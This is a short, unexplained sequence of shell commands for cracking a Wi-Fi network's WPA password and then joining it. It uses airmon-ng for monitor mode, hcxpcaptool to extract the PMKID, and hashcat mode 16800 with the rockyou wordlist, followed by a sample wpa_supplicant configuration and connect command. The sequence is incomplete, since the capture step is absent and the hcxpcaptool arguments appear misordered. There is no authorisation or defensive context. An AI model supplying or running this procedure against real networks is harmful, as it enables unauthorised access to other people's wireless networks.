airmon-ng start wlan0

hcxpcaptool -z capture.pcapng pmkid.pcapng

hashcat -m 16800 pmkid.pcapng rockyou.txt

```
network={
  ssid="example_network"
  psk="password123"
}
```

## wpa_supplicant -i <interface> -c /path/to/wpa_supplicant.conf
